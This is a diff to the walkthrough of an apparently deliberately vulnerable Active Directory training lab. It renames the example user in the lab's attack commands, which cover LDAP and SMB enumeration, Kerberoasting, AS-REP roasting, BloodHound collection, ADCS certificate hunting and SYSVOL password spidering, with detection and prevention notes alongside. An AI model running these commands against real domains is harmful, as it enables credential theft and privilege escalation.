@@ -16,9 +16,9 @@ Run from your **Kali / BlackArch** on the host bridge (`10.10.0.1` from inside t
 ldapsearch -x -H ldap://10.10.0.10 -b "DC=corp,DC=local" -s sub "(objectClass=user)" sAMAccountName
 
 # authenticated
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --users
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --groups
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --computers
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --users
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --groups
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --computers
 
 # PowerView (on ws01)
 Import-Module .\PowerView.ps1
@@ -37,7 +37,7 @@ Get-DomainComputer -Properties dnshostname, operatingsystem
 **Tools:** `impacket-GetUserSPNs`, `Rubeus`, `setspn`.
 **Steps:**
 ```bash
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
 # windows
 setspn -Q */*
 # Rubeus
@@ -55,7 +55,7 @@ setspn -Q */*
 **Steps:**
 ```bash
 # Linux
-bloodhound-python -u alice -p 'DVADlab2024!' -d corp.local -ns 10.10.0.10 -c all
+bloodhound-python -u peter.parker -p 'DVADlab2024!' -d corp.local -ns 10.10.0.10 -c all
 # Windows
 .\SharpHound.exe -c All --domain corp.local
 # upload zips into BloodHound, then run "Find Shortest Paths to Domain Admins"
@@ -76,7 +76,7 @@ Get-ADTrust -Filter *
 Get-DomainTrust -SearchBase "DC=corp,DC=local"
 ```
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-for-delegation
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --trusted-for-delegation
 ```
 **Detection:** LDAP queries against `CN=System,DC=corp,DC=local` / `trustedDomain` objects.
 **Prevention:** enable **SID filtering** on every external/forest trust (we *disabled* it deliberately). Use selective authentication where possible.
@@ -138,9 +138,9 @@ nslookup -type=ANY corp.local 10.10.0.10
 **Steps:**
 ```bash
 smbclient -L //10.10.0.13 -N                      # null
-nxc smb 10.10.0.0/24 -u alice -p 'DVADlab2024!' --shares
-nxc smb 10.10.0.13 -u alice -p 'DVADlab2024!' --spider Public --pattern '\.txt|\.ps1|\.bat|password'
-smbmap -H 10.10.0.13 -u alice -p 'DVADlab2024!' -R Public
+nxc smb 10.10.0.0/24 -u peter.parker -p 'DVADlab2024!' --shares
+nxc smb 10.10.0.13 -u peter.parker -p 'DVADlab2024!' --spider Public --pattern '\.txt|\.ps1|\.bat|password'
+smbmap -H 10.10.0.13 -u peter.parker -p 'DVADlab2024!' -R Public
 ```
 **Detection:** Event ID `5140` (network share accessed) at high volume.
 **Prevention:** disable Guest (`net user guest /active:no`), disable `RestrictNullSessAccess=1`, enable SMB signing required.
@@ -160,7 +160,7 @@ Get-SQLServerInfo -Instance sql01.corp.local
 Get-SQLServerLinkCrawl -Instance sql01 -Verbose   # link chain
 ```
 ```bash
-nxc mssql 10.10.0.14 -u alice -p 'DVADlab2024!' --local-auth
+nxc mssql 10.10.0.14 -u peter.parker -p 'DVADlab2024!' --local-auth
 ```
 **Detection:** SQL Server logs failed logins (Event `18456`). Defender for Identity has SQL discovery alerts.
 **Prevention:** disable SQL Browser service. Force Windows-only auth. Disable `xp_cmdshell`.
@@ -187,7 +187,7 @@ sudo tcpdump -i virbr1 'udp and (port 137 or port 5353 or port 5355)'
 **Tools:** `net accounts /domain`, `Get-ADDefaultDomainPasswordPolicy`, `nxc smb --pass-pol`.
 **Steps:**
 ```bash
-nxc smb 10.10.0.10 -u alice -p 'DVADlab2024!' --pass-pol
+nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --pass-pol
 ```
 ```powershell
 Get-ADDefaultDomainPasswordPolicy
@@ -204,7 +204,7 @@ Get-ADFineGrainedPasswordPolicy -Filter *      # PSO that overrides default
 **Tools:** `Certify.exe`, `Certipy find`, `certutil`.
 **Steps:**
 ```bash
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -enabled -vulnerable -stdout
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -enabled -vulnerable -stdout
 ```
 ```powershell
 .\Certify.exe find /vulnerable
@@ -224,7 +224,7 @@ certutil -dctemplate -dc dc01.corp.local
 ```bash
 impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hashes
 # or authenticated:
-impacket-GetNPUsers corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -format hashcat
+impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 -request -format hashcat
 ```
 ```powershell
 .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
@@ -256,7 +256,7 @@ Get-DomainComputer -TrustedToAuth                       # constrained delegation
 **Steps:**
 ```bash
 # Linux mount or smb spider:
-nxc smb 10.10.0.10 -u alice -p 'DVADlab2024!' \
+nxc smb 10.10.0.10 -u peter.parker -p 'DVADlab2024!' \
    --spider SYSVOL --pattern 'cpassword|password|netuse'
 ```
 ```powershell
